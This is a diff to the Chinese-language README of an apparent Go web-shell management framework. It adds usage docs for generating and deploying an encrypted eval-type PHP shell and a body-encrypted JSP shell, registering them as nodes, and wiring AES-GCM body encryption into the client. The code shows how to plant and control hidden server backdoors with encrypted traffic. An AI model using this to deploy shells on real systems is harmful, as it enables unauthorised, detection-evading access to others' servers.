@@ -55,6 +55,40 @@ func main() {
 
 也可以直接使用 `core.NewClient` 和 `httpform.New`，适合不需要节点注册表的单节点程序。
 
+## PHP 加密 shell（BodyCrypto）
+
+先用 `php.CryptoShellSource(key)` 生成并部署 eval 型加密 shell，再使用 `php-eval` profile：
+
+```go
+key := []byte("0123456789abcdef0123456789abcdef")
+shell := php.CryptoShellSource(key) // 部署到 shell.php
+
+err = mgr.Register(ctx, core.NodeConfig{
+    ID: "lab-enc", Endpoint: "https://lab.example/shell.php",
+    Adapter: "php-eval", Transport: "httpform",
+    Options: map[string]string{
+        "crypto_key_hex": hex.EncodeToString(key),
+        "crypto_mode": "aes-gcm",
+    },
+})
+```
+
+工厂会配置 httpform 的 `BodyCrypto`，并自动把 `Session.Adapter` 升级为 `php-eval`。手动组装时等价于：
+
+```go
+cr, _ := aesgcm.New(key)
+tr := httpform.NewWithOptions(url, httpform.Options{BodyCrypto: cr})
+sess := core.NewSession("lab-enc", url)
+sess.Adapter = "php-eval"
+client := core.NewClient(
+    core.WithSession(sess),
+    core.WithTransport(tr),
+    core.WithBodyCrypto(cr),
+)
+```
+
+shell 会把响应加密返回，transport 自动 `DecryptBody` 后再进入原解析链路。
+
 ## 常用操作
 
 ```go
@@ -94,6 +128,8 @@ result, err := client.Do(ctx, jsp.NewJspInfo())
 ```
 
 先用 `jsp.ShellSource()` 或 `jsp.ShellSourceWith(obf)` 生成并部署对应 JSP 文件，再使用同一份 `Obfuscator` 构造操作。`WithDynamic()` 依赖 JDK 6–14 的 Nashorn，JDK 15 及以上应使用默认静态模式。
+
+需要整包加密时使用 `jsp.CryptoBodyShellSource(key)` 部署 body 模式 shell，客户端按上面的 `BodyCrypto` 方式组装；只加密 action 字段的旧入口 `jsp.CryptoShellSource(key)` 仍保留。
 
 ## 只读策略与错误处理
 
